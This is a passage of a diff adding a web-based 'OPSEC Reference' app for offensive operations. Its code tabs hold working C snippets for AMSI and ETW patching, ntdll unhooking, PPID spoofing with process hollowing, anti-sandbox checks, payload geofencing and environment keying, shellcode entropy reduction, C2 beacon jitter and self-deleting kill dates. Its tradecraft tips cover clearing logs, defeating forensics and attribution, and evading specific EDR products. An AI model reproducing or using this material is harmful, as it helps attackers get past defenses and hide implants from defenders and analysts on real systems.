+{t:"Metadata stripping for documents",l:"c",c:"// Office documents contain author, save paths, etc.\n// PowerShell:\n// $doc = Get-ChildItem payload.docx\n// $doc | Select-Object -Property *  // view metadata\n\n// ExifTool (universal):\n// exiftool -all= document.docx\n// exiftool -all= image.png\n// exiftool -all= payload.pdf\n\n// PDF metadata:\n// Creator, Producer, Author, timestamps\n// exiftool -Author= -Creator= -Producer= doc.pdf\n\n// Code metadata:\n// .NET assemblies: AssemblyInfo.cs\n//   [assembly: AssemblyCompany(\"\")]\n//   [assembly: AssemblyCopyright(\"\")]\n// Rust: Cargo.toml authors field\n// Go: module name in go.mod\n\n// Image metadata:\n// GPS coordinates in EXIF!\n// Camera model, serial number\n// Thumbnail may contain original image\n// Always strip: exiftool -all= image.jpg"}
+];
+C.tol=[
+{t:"Entropy reduction techniques",l:"c",c:"// Raw encrypted payload: ~7.5 bits/byte (flagged!)\n// Normal .text section: ~5.5-6.0 bits/byte\n// Goal: reduce to 4.5-5.5 range\n\n// Method 1: UUID encoding\n// Convert shellcode to UUID string array:\n// {\"6850c031-6163-636c-0000-50684c77260f\",...}\n// Each UUID = 16 bytes of payload\n// Entropy: ~4.5 (looks like text data)\n\n// Method 2: IPv4 encoding\n// Encode as IP address strings:\n// {\"104.80.192.49\",\"104.97.99.108\",...}\n// Each IP = 4 bytes of payload\n// Entropy: ~4.2 (looks like config data)\n\n// Method 3: English word encoding\n// Map byte values to English words\n// Payload looks like English text\n// Entropy: ~4.0\n\n// Method 4: Null-byte interleave\n// Insert 0x00 between each payload byte\n// Doubles size but halves entropy\n// Decode at runtime: skip every other byte\n\n// Calculate: python -c\n// import math; data=open('f','rb').read()\n// freq=[data.count(bytes([i])) for i in range(256)]\n// ent=sum(-f/len(data)*math.log2(f/len(data))\n//   for f in freq if f>0)"},
+{t:"Environment keying (targeted execution)",l:"c",c:"// Payload only decrypts on target machine\n// Derive key from host-specific properties\n\nvoid KeyedPayload(PBYTE encPayload, SIZE_T len) {\n    // Derive key from hostname\n    char hostname[256];\n    GetComputerNameA(hostname, &(DWORD){256});\n\n    // Or from domain:\n    // GetEnvironmentVariableA(\"USERDOMAIN\", ...);\n    // Or username:\n    // GetEnvironmentVariableA(\"USERNAME\", ...);\n    // Or machine SID:\n    // LsaOpenPolicy + LsaQueryInformationPolicy\n\n    // Hash to create key\n    BYTE key[32];\n    SHA256(hostname, strlen(hostname), key);\n\n    // Decrypt payload\n    for (SIZE_T i = 0; i < len; i++)\n        encPayload[i] ^= key[i % 32];\n\n    // Verify decryption worked (magic check)\n    if (encPayload[0] != 0xFC) { // expected first byte\n        // Wrong host - fail silently\n        SecureZeroMemory(encPayload, len);\n        return;\n    }\n    // Execute decrypted payload...\n}"},
+{t:"Anti-sandbox checks",l:"c",c:"BOOL IsSandbox(void) {\n    // CPU cores (sandboxes often have 1-2)\n    SYSTEM_INFO si;\n    GetSystemInfo(&si);\n    if (si.dwNumberOfProcessors < 2) return TRUE;\n\n    // RAM (sandboxes often < 4GB)\n    MEMORYSTATUSEX ms = {sizeof(ms)};\n    GlobalMemoryStatusEx(&ms);\n    if (ms.ullTotalPhys < (4ULL * 1024 * 1024 * 1024))\n        return TRUE;\n\n    // Disk size (< 60GB suspicious)\n    ULARGE_INTEGER disk;\n    GetDiskFreeSpaceExA(\"C:\\\\\", NULL, &disk, NULL);\n    if (disk.QuadPart < (60ULL * 1024 * 1024 * 1024))\n        return TRUE;\n\n    // Time acceleration check\n    DWORD t1 = GetTickCount();\n    Sleep(1000);\n    DWORD t2 = GetTickCount();\n    if ((t2 - t1) < 900) return TRUE; // accelerated\n\n    // Recent user activity\n    LASTINPUTINFO lii = {sizeof(lii)};\n    GetLastInputInfo(&lii);\n    if ((GetTickCount() - lii.dwTime) > 600000)\n        return TRUE; // no input in 10 min\n\n    return FALSE;\n}"}
+];
+C.com=[
+{t:"C2 sleep with jitter implementation",l:"c",c:"void BeaconSleep(DWORD baseMs, DWORD jitterPct) {\n    // jitterPct = 0-50 (percentage)\n    DWORD maxJitter = baseMs * jitterPct / 100;\n\n    // Crypto-quality random\n    DWORD rand;\n    BCryptGenRandom(NULL, (PBYTE)&rand, 4,\n        BCRYPT_USE_SYSTEM_PREFERRED_RNG);\n\n    // Random offset: -jitter to +jitter\n    LONG offset = (rand % (maxJitter * 2)) - maxJitter;\n    DWORD sleepMs = baseMs + offset;\n\n    // Never sleep less than 30s\n    if (sleepMs < 30000) sleepMs = 30000;\n\n    Sleep(sleepMs);\n}\n\n// Usage: 5 min base, 40% jitter\n// Actual sleep: 180s - 420s (3-7 min)\nBeaconSleep(300000, 40);\n\n// Business hours check:\nSYSTEMTIME st; GetLocalTime(&st);\nif (st.wHour < 8 || st.wHour > 18 ||\n    st.wDayOfWeek == 0 || st.wDayOfWeek == 6)\n    BeaconSleep(3600000, 50); // 1hr during off-hours"},
+{t:"Kill date implementation",l:"c",c:"BOOL PastKillDate(void) {\n    // Hardcode kill date (compile-time)\n    // 2025-03-15 = days since epoch or FILETIME\n    SYSTEMTIME killDate = {2025, 3, 0, 15, 0, 0, 0, 0};\n    FILETIME killFT;\n    SystemTimeToFileTime(&killDate, &killFT);\n\n    FILETIME nowFT;\n    GetSystemTimeAsFileTime(&nowFT);\n\n    if (CompareFileTime(&nowFT, &killFT) > 0) {\n        // Past kill date - self destruct\n        CleanupPersistence();\n        SelfDelete();\n        return TRUE;\n    }\n    return FALSE;\n}\n\n// Self-delete technique:\nvoid SelfDelete(void) {\n    char self[MAX_PATH];\n    GetModuleFileNameA(NULL, self, MAX_PATH);\n    char cmd[512];\n    snprintf(cmd, 512,\n        \"cmd /c ping localhost -n 3 > nul & del /f \\\"%s\\\"\",\n        self);\n    WinExec(cmd, SW_HIDE);\n    ExitProcess(0);\n}"}
+];
+C.exe=[
+{t:"AMSI + ETW bypass combo",l:"c",c:"void BypassDefenses(void) {\n    // 1. Patch ETW first (kills telemetry)\n    PVOID pEtw = GetProcAddress(\n        GetModuleHandleA(\"ntdll.dll\"), \"EtwEventWrite\");\n    DWORD old;\n    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);\n    *(DWORD*)pEtw = 0x00C3C033; // xor eax,eax; ret\n    VirtualProtect(pEtw, 4, old, &old);\n\n    // 2. Patch AMSI (kills script scanning)\n    HMODULE hAmsi = LoadLibraryA(\"amsi.dll\");\n    if (hAmsi) {\n        PVOID pScan = GetProcAddress(hAmsi,\n            \"AmsiScanBuffer\");\n        VirtualProtect(pScan, 6, PAGE_EXECUTE_READWRITE,\n            &old);\n        // mov eax, 0x80070057; ret (E_INVALIDARG)\n        BYTE patch[] = {0xB8,0x57,0x00,0x07,0x80,0xC3};\n        memcpy(pScan, patch, 6);\n        VirtualProtect(pScan, 6, old, &old);\n    }\n\n    // 3. Now execute payload\n    // ETW blind + AMSI disabled = safe to run\n}"},
+{t:"Donut shellcode from .NET assembly",l:"c",c:"// Donut: converts PE/.NET to position-independent shellcode\n// https://github.com/TheWover/donut\n\n// Usage:\n// donut -i payload.exe -o loader.bin\n// donut -i payload.dll -c ClassName -m Method -o sc.bin\n//\n// The generated shellcode:\n// 1. Loads CLR if .NET\n// 2. Decrypts embedded payload\n// 3. Maps into memory\n// 4. Resolves imports\n// 5. Executes entry point\n//\n// All in-memory, no disk touch\n// Works with: .NET EXE, .NET DLL, native PE, COM\n//\n// Parameters:\n// -e 3    = exit thread (not process)\n// -b 1    = AMSI/WDLP bypass\n// -k 2    = random encryption key\n// -z 2    = LZNT1 compression\n// -t      = use thread (vs direct call)\n//\n// Inject the output shellcode via any method:\n// Process injection, callback, APC, etc."}
+];
+C.adv=[
+{t:"Sleep obfuscation (Ekko concept)",l:"c",c:"// Encrypt payload during sleep to avoid memory scans\nvoid SleepEncrypted(PVOID payload, SIZE_T len, DWORD ms) {\n    BYTE key[16];\n    BCryptGenRandom(NULL, key, 16,\n        BCRYPT_USE_SYSTEM_PREFERRED_RNG);\n\n    // XOR encrypt payload in-place\n    for (SIZE_T i = 0; i < len; i++)\n        ((PBYTE)payload)[i] ^= key[i % 16];\n\n    // Mark as non-executable during sleep\n    DWORD old;\n    VirtualProtect(payload, len, PAGE_READWRITE, &old);\n\n    // Sleep... (memory scanner sees encrypted RW blob)\n    Sleep(ms);\n\n    // Restore: decrypt and mark executable\n    VirtualProtect(payload, len,\n        PAGE_EXECUTE_READ, &old);\n    for (SIZE_T i = 0; i < len; i++)\n        ((PBYTE)payload)[i] ^= key[i % 16];\n\n    // Now execute next beacon cycle\n}\n// Full Ekko uses ROP chain with timers for\n// automatic encrypt/sleep/decrypt without\n// any executable code running during sleep"},
+{t:"Geofencing implementation",l:"c",c:"BOOL IsTargetGeo(void) {\n    // Method 1: Check system timezone\n    TIME_ZONE_INFORMATION tzi;\n    GetTimeZoneInformation(&tzi);\n    // Compare tzi.StandardName or tzi.Bias\n    // US Eastern = -300, US Pacific = -480\n    if (tzi.Bias != -300) return FALSE; // not EST\n\n    // Method 2: Check system locale\n    WCHAR locale[32];\n    GetUserDefaultLocaleName(locale, 32);\n    // \"en-US\", \"en-GB\", etc.\n    if (wcsncmp(locale, L\"en-US\", 5) != 0) return FALSE;\n\n    // Method 3: Keyboard layout\n    HKL hkl = GetKeyboardLayout(0);\n    LANGID lang = LOWORD((DWORD)(ULONG_PTR)hkl);\n    // 0x0409 = English (US)\n    if (lang != 0x0409) return FALSE;\n\n    // Method 4: Domain name check\n    WCHAR domain[256];\n    DWORD sz = 256;\n    GetComputerNameExW(ComputerNameDnsDomain, domain, &sz);\n    if (wcsstr(domain, L\"targetcorp\") == NULL)\n        return FALSE;\n\n    return TRUE;\n}"}
+];
+C.kit=[
+{t:"Pre-op infrastructure validation",l:"c",c:"// Verify before going operational:\n\n// 1. Domain reputation check\ncurl -s \"https://sitereview.bluecoat.com/resource/lookup\"\n  -d \"url=yourdomain.com\"\n// Expected: Business/Technology category\n\n// 2. Redirector filtering test\ncurl -A \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n  https://redirector/api/v1/status\n// Should forward to C2\n\ncurl -A \"curl/7.68.0\" https://redirector/api/v1/status\n// Should redirect to legit site\n\n// 3. SSL/TLS verification\nopenssl s_client -connect redirector:443\n// Verify cert chain, no self-signed\n\n// 4. JA3 fingerprint check\n// Use jarm or ja3er.com to verify fingerprint\n// matches expected browser\n\n// 5. DNS propagation\ndig +short yourdomain.com @8.8.8.8\n// Should resolve to CDN/redirector, not C2"}
+];
+C.byp=[
+{t:"EDR unhook: remap ntdll from KnownDlls",l:"c",c:"void UnhookNtdll(void) {\n    // Open clean ntdll from kernel cache\n    HANDLE hSection;\n    UNICODE_STRING name;\n    RtlInitUnicodeString(&name, L\"\\\\KnownDlls\\\\ntdll.dll\");\n    OBJECT_ATTRIBUTES oa;\n    InitializeObjectAttributes(&oa, &name,\n        OBJ_CASE_INSENSITIVE, NULL, NULL);\n    NtOpenSection(&hSection, SECTION_MAP_READ, &oa);\n\n    // Map clean copy\n    PVOID clean = NULL; SIZE_T sz = 0;\n    NtMapViewOfSection(hSection, (HANDLE)-1, &clean,\n        0, 0, NULL, &sz, 1, 0, PAGE_READONLY);\n\n    // Get current ntdll base\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n\n    // Overwrite .text section with clean copy\n    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)\n        ((PBYTE)hNtdll + ((PIMAGE_DOS_HEADER)hNtdll)->e_lfanew);\n    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);\n    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {\n        if (memcmp(sec[i].Name, \".text\", 5) == 0) {\n            PVOID dst = (PBYTE)hNtdll + sec[i].VirtualAddress;\n            PVOID src = (PBYTE)clean + sec[i].VirtualAddress;\n            DWORD old;\n            VirtualProtect(dst, sec[i].Misc.VirtualSize,\n                PAGE_EXECUTE_READWRITE, &old);\n            memcpy(dst, src, sec[i].Misc.VirtualSize);\n            VirtualProtect(dst, sec[i].Misc.VirtualSize,\n                old, &old);\n            break;\n        }\n    }\n    NtUnmapViewOfSection((HANDLE)-1, clean);\n}"},
+{t:"Process hollowing for clean parent tree",l:"c",c:"// Spawn legitimate process as cover\n// Inject payload -> looks like normal process\n\n// Good cover processes:\n// - RuntimeBroker.exe (many instances normal)\n// - dllhost.exe (COM surrogate, short-lived)\n// - svchost.exe (PPID spoof to services.exe)\n\n// PPID spoof + injection:\nSIZE_T sz;\nInitializeProcThreadAttributeList(NULL, 1, 0, &sz);\nLPPROC_THREAD_ATTRIBUTE_LIST al = malloc(sz);\nInitializeProcThreadAttributeList(al, 1, 0, &sz);\n\n// Spoof parent to explorer.exe or services.exe\nHANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS,\n    FALSE, explorerPid);\nUpdateProcThreadAttribute(al, 0,\n    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,\n    &hParent, sizeof(HANDLE), NULL, NULL);\n\nSTARTUPINFOEXA si = {0};\nsi.StartupInfo.cb = sizeof(si);\nsi.lpAttributeList = al;\nCreateProcessA(NULL, \"RuntimeBroker.exe\", NULL, NULL,\n    FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED,\n    NULL, NULL, &si.StartupInfo, &pi);\n// Now inject into pi.hProcess..."}
+];
+return C[s]||[];
+}
+var TR={
+net:[
+{t:"Never expose C2 IP directly",d:"Always use at least one redirector between target and C2. If redirector is burned, spin a new one without losing C2 infrastructure. Treat redirectors as disposable, C2 as permanent."},
+{t:"Domain age matters more than domain name",d:"Newly registered domains (< 30 days) are automatically flagged by most security products. Purchase aged domains with existing categorization. 6+ months of history is ideal."},
+{t:"JA3 fingerprint betrays your tooling",d:"Every TLS client has a unique JA3 fingerprint. Default Cobalt Strike, Meterpreter, and Python requests all have known fingerprints. Use uTLS or CycleTLS to match real browser fingerprints."},
+{t:"CDN fronting survives IP blocking",d:"When C2 goes through a CDN, blocking requires blocking the entire CDN IP range (CloudFront, Azure CDN). Most organizations can't block major CDN providers."},
+{t:"Separate registration and operational VPNs",d:"Use Tor/separate VPN for all infrastructure registration. Use different VPN for operational traffic. If one is compromised, the other remains clean."},
+{t:"DNS TTL should match legitimate sites",d:"Extremely low TTL (60s) on C2 domains is suspicious. Match to what legitimate sites use (300-3600s). Only lower during active domain rotation."}
+],
+hst:[
+{t:"Full log clear is worse than selective",d:"Event 1102 (audit log cleared) is a red alert for SOC teams. Selectively removing events or suspending the EventLog service threads is far less detectable than clearing everything."},
+{t:"$FILE_NAME survives timestomping",d:"SetFileTime only modifies $STANDARD_INFORMATION in NTFS MFT. The $FILE_NAME attribute has separate timestamps that are kernel-only modifiable. Forensics compares both — mismatches flag tampering."},
+{t:"Prefetch persists across reboots",d:"Every executed binary gets a .pf file in C:\\Windows\\Prefetch. Contains filename, execution count, last 8 run times. Delete after operations, or avoid Prefetch-triggering execution methods."},
+{t:"ShimCache clears only on clean reboot",d:"AppCompatCache (ShimCache) writes to registry only during shutdown. Crash or hard power-off preserves old cache. Normal reboot writes current state."},
+{t:"Memory forensics sees everything in cleartext",d:"RAM captures will find decrypted payloads, command history, credentials. Encrypt payload during sleep, wipe sensitive data after use, and consider sleep obfuscation for long-running implants."}
+],
+idn:[
+{t:"PDB paths are the #1 attribution vector",d:"The full path to your .pdb file is embedded in compiled binaries. C:\\Users\\YourName\\... directly identifies you. Always strip or replace PDB paths. Use /PDBALTPATH:%_PDB% at compile time."},
+{t:"Rich header fingerprints your toolchain",d:"The Rich header in PE files identifies exact compiler and linker versions. Researchers track threat actors by Rich header patterns. Strip it entirely or randomize it."},
+{t:"Timestamps create activity patterns",d:"Compile timestamps, git commit times, and file modification times reveal your working hours and timezone. An attacker consistently compiling at 9-17 UTC+3 narrows geography significantly."},
+{t:"Code style is a fingerprint",d:"Variable naming conventions, error handling patterns, comment style, and architectural choices are surprisingly unique. Vary deliberately between operations."},
+{t:"EXIF data in images leaks GPS",d:"Screenshots and photos may contain GPS coordinates, device serial numbers, and software versions. Always strip EXIF metadata from any file that leaves your machine."}
+],
+tol:[
+{t:"Entropy above 7.0 is an instant flag",d:"Encrypted/compressed payloads have near-maximum entropy (7.5+ bits/byte). This is the first thing static analysis checks. Use UUID encoding, English word mapping, or null-interleaving to reduce below 6.0."},
+{t:"VirusTotal is public — never upload ops tools",d:"Anything uploaded to VT is permanently stored and searchable by defenders. Use Antiscan.me (no-distribute scanner) or private scanning infrastructure. Even hashes of your files get shared."},
+{t:"Unique builds prevent cross-op correlation",d:"If two engagements use identical binaries, they can be linked. Recompile with different keys, strings, and section names per engagement. Automate build variation."},
+{t:"Environment keying defeats sandbox analysis",d:"Derive decryption key from target hostname/domain/SID. Payload is inert on any other machine. Sandbox can't detonate it. IR team can't analyze without the target environment."},
+{t:"Test against the target's specific EDR",d:"Generic AV evasion doesn't guarantee EDR bypass. If you know the target runs CrowdStrike, test against CrowdStrike specifically. Each EDR has different detection strengths."},
+{t:"Staged payloads minimize disk exposure",d:"Small loader on disk, large payload in memory. The loader has minimal functionality (just download + decrypt + execute). Less surface area for static analysis."}
+],
+com:[
+{t:"Sleep=0 is the #1 operator mistake",d:"Zero sleep means continuous beaconing — extremely obvious in network logs. Even 10s is too fast for long-haul ops. Minimum 60s with 30%+ jitter. Go to 300-600s for persistent access."},
+{t:"Business hours beaconing blends in",d:"Beacon traffic at 3 AM on a Saturday is anomalous. Configure working_hours in C2 profile. Outside business hours, extend sleep to 30-60 minutes or go silent entirely."},
+{t:"Multiple C2 channels prevent burn",d:"If HTTP C2 is blocked, DNS fallback keeps you alive. If DNS is blocked, SMB pipe to another compromised host. Layer at least 2 independent channels with different protocols."},
+{t:"Kill dates prevent infrastructure exposure",d:"Forgotten implants eventually get discovered and analyzed. Set kill dates that auto-remove persistence and self-delete the payload. No operation should run indefinitely without review."},
+{t:"Jitter must be truly random",d:"Predictable jitter patterns (always ±5s) are detectable via statistical analysis. Use crypto-quality random (BCryptGenRandom) for jitter calculation, not simple modulo."}
+],
+exe:[
+{t:"Patch ETW before AMSI",d:"ETW telemetry reports your AMSI bypass to EDR. Patch EtwEventWrite first, then AMSI, then execute payload. Order matters: ETW → AMSI → CLR ETW → payload."},
+{t:"LOLBins still get flagged on behavior",d:"Running msbuild.exe with inline C# task or certutil downloading files triggers behavioral rules even though the binary is signed. Combine LOLBin execution with unusual parent processes."},
+{t:"In-memory ≠ invisible",d:"Memory-only payloads avoid disk scanning but memory scanning (periodic or on-demand) can find them. Encrypt during sleep, wipe PE headers after mapping, use image-backed allocations."},
+{t:"Callback execution avoids CreateThread",d:"EDR hooks CreateThread/CreateRemoteThread. Using callbacks (EnumWindows, timer callbacks, thread pool) achieves code execution without triggering thread creation hooks."},
+{t:"CLR loading generates its own ETW events",d:".NET execution produces events via Microsoft-Windows-DotNETRuntime ETW provider. This is separate from ntdll ETW. You need to patch both for full coverage."}
+],
+adv:[
+{t:"Sleep obfuscation is the new standard",d:"Any long-running implant needs sleep obfuscation. Encrypt payload + mark RW during sleep. Memory scanners see random encrypted data with no execute permission. Ekko, Foliage, Cronos are reference implementations."},
+{t:"Geofencing prevents broad analysis",d:"If payload only decrypts in US Eastern timezone + specific domain, researchers in other regions can't analyze it. Multiple geofencing checks layered together increase effectiveness."},
+{t:"Environment keying > obfuscation",d:"Obfuscation hides what the payload does. Environment keying makes the payload completely inert outside the target. Even with the binary, analysts can't decrypt without the target environment."},
+{t:"Full ntdll unhook is now detectable",d:"Remapping entire ntdll from KnownDlls changes .text from image-backed to private memory. Some EDRs specifically check for this. Prefer indirect syscalls which leave ntdll untouched."},
+{t:"Self-delete race condition",d:"Standard self-delete (cmd /c del) has a timing window. Use NtSetInformationFile with FileDispositionInformation while file is still open, or rename to alternate data stream then delete."}
+],
+kit:[
+{t:"Checklist before first callback",d:"Before deploying: test redirector filtering, verify domain categorization, check JA3 fingerprint, confirm SSL cert chain, validate kill date, test self-destruct mechanism. One missed item can burn the entire op."},
+{t:"Rotate infrastructure on schedule",d:"Don't wait for detection to rotate. Pre-plan domain rotation (weekly or bi-weekly). Redirector IPs should rotate faster than domains. Have replacements staged and ready."},
+{t:"Deconfliction saves operations",d:"If you're on a red team engagement and another team or real attacker is in the same network, lack of deconfliction causes chaos. Document all IOCs and share with engagement managers."},
+{t:"Post-op cleanup is as important as the op",d:"Leftover persistence, staged payloads, and infrastructure that isn't torn down can be discovered later and attributed. Full cleanup checklist after every engagement."}
+],
+byp:[
+{t:"Each EDR has a different weak point",d:"CrowdStrike is strong on kernel callbacks but weaker on usermode .NET. Defender relies heavily on AMSI/cloud. SentinelOne uses behavioral AI that can be trained around. Research your specific target."},
+{t:"PowerShell.exe is not required for PowerShell",d:"System.Management.Automation.dll can be loaded from any process. Avoids PowerShell-specific logging (ScriptBlock, Module). But CLR loading events still fire."},
+{t:"Sysmon rules have blind spots",d:"Sysmon configs are rule-based. If an event ID isn't monitored or a specific path is excluded, operations in that gap are invisible. SwiftOnSecurity config has known blind spots."},
+{t:"Stack spoofing defeats call-stack heuristics",d:"EDR checks call stacks for API calls from suspicious memory. Stack spoofing (SilentMoonwalk, Unwinder) fabricates a legitimate-looking call stack from ntdll through kernel32."},
+{t:"Private memory allocations are suspicious",d:"Normal code runs from image-backed memory (DLL sections). Shellcode in private VirtualAlloc memory is anomalous. Module stomping or mapping into existing DLL sections avoids this."},
+{t:"Kernel ETW can't be patched from usermode",d:"Usermode ETW bypass only affects usermode providers. Kernel-level ETW (thread creation, image loads, registry ops) still fires. Minimize operations that trigger kernel callbacks."}
+]
+};
+function render(){
+var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s),tricks=TR[S.s]||[];
+var flow='';
+if(S.s==='net')flow=fNET();else if(S.s==='hst')flow=fHST();else if(S.s==='idn')flow=fIDN();
+else if(S.s==='tol')flow=fTOL();else if(S.s==='com')flow=fCOM();else if(S.s==='exe')flow=fEXE();
+else if(S.s==='adv')flow=fADV();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples for this section.</div>':
+codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+var thtml=tricks.length===0?'':
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">OPSEC TRADECRAFT</div>'+
+tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>OPSEC Reference</h1><div class="sub">Network \u2022 Host \u2022 Identity \u2022 Tooling \u2022 Comms \u2022 Execution \u2022 Advanced \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#60a5fa",l:"Network"},{c:"#f87171",l:"Host"},{c:"#a78bfa",l:"Identity"},{c:"#fbbf24",l:"Tooling"},{c:"#34d399",l:"Comms"},{c:"#f59e0b",l:"Execution"},{c:"#e879f9",l:"Advanced"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+$$('.cp').forEach(function(p){
+p.querySelector('.ct2').onclick=function(){
+var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+if(ex){ex.remove();cv.classList.remove('op');return}
+cv.classList.add('op');
+var ci=parseInt(p.dataset.ci),c=codes[ci];
+var pre=document.createElement('pre');pre.className='cb mono';
+pre.innerHTML=c.c.split('\n').map(function(line){
+var ci2=line.indexOf('//');
+if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
+if(line.trimStart().charAt(0)==='#')return'<span class="pp">'+esc(line)+'</span>';
+return esc(line);
+}).join('\n');
+p.appendChild(pre);};
+});
+$$('.ti').forEach(function(p){
+p.querySelector('.tt').onclick=function(){
+var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+p.classList.add('op');cv.classList.add('op');
+var ti=parseInt(p.dataset.ti);
+var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+p.appendChild(div);};
+});
+}
+render();
+</script>
+</body>
+</html>
